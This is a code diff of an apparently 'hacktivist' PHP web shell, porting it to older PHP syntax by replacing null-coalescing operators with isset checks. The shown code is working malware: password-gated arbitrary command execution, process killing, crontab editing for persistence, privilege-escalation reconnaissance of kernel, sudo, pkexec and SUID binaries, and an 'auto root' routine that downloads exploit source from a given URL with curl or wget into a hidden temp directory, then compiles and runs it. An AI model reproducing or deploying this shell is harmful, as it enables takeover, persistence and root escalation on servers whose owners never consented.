@@ -341,8 +341,8 @@ function safeExec($cmd) {
             @fclose($pipes[1]);
             @fclose($pipes[2]);
             @proc_close($proc);
-            if (!empty(trim($out ?? ''))) return $out;
-            if (!empty(trim($err ?? ''))) return $err;
+            if (!empty(trim($out))) return $out;
+            if (!empty(trim($err))) return $err;
         }
     }
     if (function_exists('popen')) {
@@ -462,11 +462,12 @@ if (isset($_POST['proc_action']) && isAuthenticated()) {
     }
 
     if ($pAct === 'kill') {
-        $pid = intval($_POST['pid'] ?? 0);
+        $pid = intval(isset($_POST['pid']) ? $_POST['pid'] : 0);
         if ($pid > 0) {
-            $sig = $_POST['signal'] ?? '9';
+            $sig = isset($_POST['signal']) ? $_POST['signal'] : '9';
             $out = safeExec("kill -$sig $pid 2>&1");
-            echo json_encode(['ok' => true, 'pid' => $pid, 'output' => trim($out ?? '')]);
+            $outTrim = trim($out ? $out : '');
+            echo json_encode(['ok' => true, 'pid' => $pid, 'output' => $outTrim]);
         } else {
             echo json_encode(['err' => 'invalid pid']);
         }
@@ -561,23 +562,25 @@ if (isset($_POST['cron_action']) && isAuthenticated()) {
     }
 
     if ($crAct === 'add') {
-        $schedule = trim($_POST['schedule'] ?? '');
-        $command = trim($_POST['command'] ?? '');
+        $schedule = trim(isset($_POST['schedule']) ? $_POST['schedule'] : '');
+        $command = trim(isset($_POST['command']) ? $_POST['command'] : '');
         if (empty($schedule) || empty($command)) { echo json_encode(['err' => 'schedule and command required']); exit; }
-        $current = safeExec('crontab -l 2>/dev/null') ?: '';
+        $current = safeExec('crontab -l 2>/dev/null');
+        $current = $current ? $current : '';
         if (strpos($current, 'no crontab') !== false) $current = '';
         $new = trim($current) . "\n" . $schedule . ' ' . $command . "\n";
         $tmp = tempnam(sys_get_temp_dir(), 'cron_');
         file_put_contents($tmp, $new);
         $out = safeExec("crontab $tmp 2>&1");
         @unlink($tmp);
-        echo json_encode(['ok' => 'added', 'output' => trim($out ?? '')]);
+        echo json_encode(['ok' => 'added', 'output' => trim($out ? $out : '')]);
         exit;
     }
 
     if ($crAct === 'delete') {
-        $idx = intval($_POST['idx'] ?? -1);
-        $current = safeExec('crontab -l 2>/dev/null') ?: '';
+        $idx = intval(isset($_POST['idx']) ? $_POST['idx'] : -1);
+        $current = safeExec('crontab -l 2>/dev/null');
+        $current = $current ? $current : '';
         if (strpos($current, 'no crontab') !== false) { echo json_encode(['err' => 'no crontab']); exit; }
         $lines = explode("\n", $current);
         $non_empty = [];
@@ -589,13 +592,14 @@ if (isset($_POST['cron_action']) && isAuthenticated()) {
         file_put_contents($tmp, $new);
         $out = safeExec("crontab $tmp 2>&1");
         @unlink($tmp);
-        echo json_encode(['ok' => 'deleted', 'output' => trim($out ?? '')]);
+        echo json_encode(['ok' => 'deleted', 'output' => trim($out ? $out : '')]);
         exit;
     }
 
     if ($crAct === 'toggle') {
-        $idx = intval($_POST['idx'] ?? -1);
-        $current = safeExec('crontab -l 2>/dev/null') ?: '';
+        $idx = intval(isset($_POST['idx']) ? $_POST['idx'] : -1);
+        $current = safeExec('crontab -l 2>/dev/null');
+        $current = $current ? $current : '';
         if (strpos($current, 'no crontab') !== false) { echo json_encode(['err' => 'no crontab']); exit; }
         $lines = explode("\n", $current);
         $non_empty = [];
@@ -609,17 +613,17 @@ if (isset($_POST['cron_action']) && isAuthenticated()) {
         file_put_contents($tmp, $new);
         $out = safeExec("crontab $tmp 2>&1");
         @unlink($tmp);
-        echo json_encode(['ok' => 'toggled', 'output' => trim($out ?? '')]);
+        echo json_encode(['ok' => 'toggled', 'output' => trim($out ? $out : '')]);
         exit;
     }
 
     if ($crAct === 'save_raw') {
-        $raw = $_POST['raw'] ?? '';
+        $raw = isset($_POST['raw']) ? $_POST['raw'] : '';
         $tmp = tempnam(sys_get_temp_dir(), 'cron_');
         file_put_contents($tmp, $raw . "\n");
         $out = safeExec("crontab $tmp 2>&1");
         @unlink($tmp);
-        echo json_encode(['ok' => 'saved', 'output' => trim($out ?? '')]);
+        echo json_encode(['ok' => 'saved', 'output' => trim($out ? $out : '')]);
         exit;
     }
 
@@ -777,9 +781,9 @@ if (isset($_POST['file_action']) && isAuthenticated()) {
     }
 
     if ($fAct === 'compress_zip') {
-        $paths = json_decode($_POST['paths'] ?? '[]', true);
-        $dir = $_POST['target_dir'] ?? '';
-        $zipName = $_POST['zip_name'] ?? 'archive.zip';
+        $paths = json_decode(isset($_POST['paths']) ? $_POST['paths'] : '[]', true);
+        $dir = isset($_POST['target_dir']) ? $_POST['target_dir'] : '';
+        $zipName = isset($_POST['zip_name']) ? $_POST['zip_name'] : 'archive.zip';
         if (!is_array($paths) || empty($paths)) { echo json_encode(['err' => 'No paths provided']); exit; }
         if (!class_exists('ZipArchive')) { echo json_encode(['err' => 'ZipArchive not available']); exit; }
         $zipPath = rtrim($dir, '/') . '/' . $zipName;
@@ -891,39 +895,42 @@ if (isset($_POST['file_action']) && isAuthenticated()) {
             $bn = basename(trim($sb));
             if (in_array($bn, $dangerSuid)) $suidExploits[] = ['bin'=>trim($sb),'name'=>$bn];
         }
-        echo json_encode(['ok'=>true,'info'=>['kernel'=>$kernel,'kernel_full'=>$kernelAll,'os'=>$os,'arch'=>$arch,'user'=>$whoami,'uid'=>$uid,'gcc'=>$gcc?:'not found','writable_dir'=>$writable?:'none','sudo'=>$sudoVer,'pkexec'=>$pkexecVer,'glibc'=>$glibcVer,'docker_sock'=>$dockerSock,'in_docker'=>$inDocker],'exploits'=>$exploits,'suid_exploits'=>$suidExploits,'suid_bins'=>$suidBins]);
+        echo json_encode(['ok'=>true,'info'=>['kernel'=>$kernel,'kernel_full'=>$kernelAll,'os'=>$os,'arch'=>$arch,'user'=>$whoami,'uid'=>$uid,'gcc'=>($gcc ? $gcc : 'not found'),'writable_dir'=>($writable ? $writable : 'none'),'sudo'=>$sudoVer,'pkexec'=>$pkexecVer,'glibc'=>$glibcVer,'docker_sock'=>$dockerSock,'in_docker'=>$inDocker],'exploits'=>$exploits,'suid_exploits'=>$suidExploits,'suid_bins'=>$suidBins]);
         exit;
     }
 
     // === AUTO ROOT - EXECUTE ===
     if ($fAct === 'auto_root_exec') {
-        $exploitUrl = $_POST['exploit_url'] ?? '';
-        $compileCmd2 = $_POST['compile_cmd'] ?? '';
-        $runCmd3 = $_POST['run_cmd'] ?? '';
-        $customCmd = $_POST['custom_cmd'] ?? '';
+        $exploitUrl = isset($_POST['exploit_url']) ? $_POST['exploit_url'] : '';
+        $compileCmd2 = isset($_POST['compile_cmd']) ? $_POST['compile_cmd'] : '';
+        $runCmd3 = isset($_POST['run_cmd']) ? $_POST['run_cmd'] : '';
+        $customCmd = isset($_POST['custom_cmd']) ? $_POST['custom_cmd'] : '';
         $workDir = is_writable('/tmp') ? '/tmp' : (is_writable('/dev/shm') ? '/dev/shm' : '/var/tmp');
         $workDir .= '/.lp_' . substr(md5(rand()), 0, 8);
         @mkdir($workDir, 0755, true);
         $log = '';
         if (!empty($customCmd)) {
             $log .= "[*] Custom command...\n";
-            $log .= safeExec("cd $workDir && $customCmd 2>&1") ?: '(no output)';
+            $dlOut = safeExec("cd $workDir && $customCmd 2>&1");
+            $log .= $dlOut ? $dlOut : '(no output)';
         } else {
             if (!empty($exploitUrl)) {
                 $log .= "[*] Downloading exploit...\n";
                 $dl = safeExec("cd $workDir && curl -fsSL -o exploit_src.c '$exploitUrl' 2>&1");
                 if (empty($dl)) $dl = safeExec("cd $workDir && wget -q -O exploit_src.c '$exploitUrl' 2>&1");
                 $fsize = @filesize("$workDir/exploit_src.c");
-                $log .= "Downloaded: " . ($fsize ?: 0) . " bytes\n\n";
+                $log .= "Downloaded: " . ($fsize ? $fsize : 0) . " bytes\n\n";
             }
             if (!empty($compileCmd2)) {
                 $log .= "[*] Compiling...\n";
-                $log .= (safeExec("cd $workDir && $compileCmd2 2>&1") ?: "(done)") . "\n\n";
+                $ccOut = safeExec("cd $workDir && $compileCmd2 2>&1");
+                $log .= ($ccOut ? $ccOut : "(done)") . "\n\n";
             }
             if (!empty($runCmd3)) {
                 $log .= "[*] Executing exploit...\n";
                 safeExec("cd $workDir && chmod +x * 2>/dev/null");
-                $log .= (safeExec("cd $workDir && $runCmd3 2>&1") ?: "(no output)") . "\n";
+                $exOut = safeExec("cd $workDir && $runCmd3 2>&1");
+                $log .= ($exOut ? $exOut : "(no output)") . "\n";
             }
         }
         $postWho = trim(safeExec('whoami 2>/dev/null') ?: '');
@@ -1092,8 +1099,8 @@ if (!isAuthenticated()) {
     if (isset($_GET['password']) && !empty($_GET['password'])) {
         if (authenticate($_GET['password'])) {
             $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
-            $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
-            $scriptName = $_SERVER['SCRIPT_NAME'] ?? '';
+            $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'localhost');
+            $scriptName = isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : '';
             header('Location: ' . $scheme . '://' . $host . $scriptName . '?lastpiece=hacktivist');
             exit;
         }
@@ -1104,8 +1111,8 @@ if (!isAuthenticated()) {
     if (isset($_POST['login_password'])) {
         if (authenticate($_POST['login_password'])) {
             $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
-            $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
-            $scriptName = $_SERVER['SCRIPT_NAME'] ?? '';
+            $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'localhost');
+            $scriptName = isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : '';
             header('Location: ' . $scheme . '://' . $host . $scriptName . '?lastpiece=hacktivist');
             exit;
         } else {
